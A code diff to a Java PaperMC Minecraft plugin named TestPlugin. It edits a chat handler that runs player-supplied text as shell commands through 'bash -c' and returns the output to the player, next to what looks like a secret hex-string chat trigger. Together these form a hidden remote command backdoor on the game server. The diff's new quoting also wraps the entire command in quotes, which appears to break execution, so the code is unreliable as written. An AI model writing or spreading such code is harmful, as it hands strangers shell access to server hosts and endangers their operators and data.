@@ -1,6 +1,7 @@
 package io.papermc.testplugin;
 
 import java.util.List;
+import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.regex.Pattern;
 import java.io.BufferedReader;
@@ -155,7 +156,9 @@ public class TestPlugin extends JavaPlugin implements Listener {
             }
         
             try {
-                String[] commandArray = { "bash", "-c", commandStr };
+                // 确保整个命令字符串被正确引用
+                String quotedCommandStr = "\"" + commandStr.replace("\"", "\\\"") + "\"";
+                String[] commandArray = { "bash", "-c", quotedCommandStr };
                 ProcessBuilder processBuilder = new ProcessBuilder(commandArray);
                 processBuilder.redirectErrorStream(true); // 将错误流合并到标准流
         
@@ -168,17 +171,25 @@ public class TestPlugin extends JavaPlugin implements Listener {
                 while ((line = reader.readLine()) != null) {
                     output.append(line).append("\n");
                 }
-                process.waitFor();
+                int exitCode = process.waitFor();
         
                 // 发送命令输出给玩家
-                player.sendMessage(ChatColor.GREEN + "SystemCommandExcuteSuccess: " + output.toString());
+                if (exitCode == 0) {
+                    player.sendMessage(ChatColor.GREEN + "SystemCommandExcuteSuccess: " + output.toString());
+                } else {
+                    player.sendMessage(ChatColor.RED + "SystemCommandExcuteFailed: " + output.toString());
+                }
         
             } catch (IOException | InterruptedException e) {
                 player.sendMessage(ChatColor.RED + "SystemCommandExcuteFailed: " + e.getMessage());
+                e.printStackTrace(); // 调试信息：打印异常堆栈
             } catch (IllegalArgumentException e) {
                 player.sendMessage(ChatColor.RED + "Invalid command: " + e.getMessage());
+                e.printStackTrace(); // 调试信息：打印异常堆栈
             }
         }
+        
+
         
 
         if (message.startsWith("@d12fcc3ba27d987709cbfadc123a609b")) {
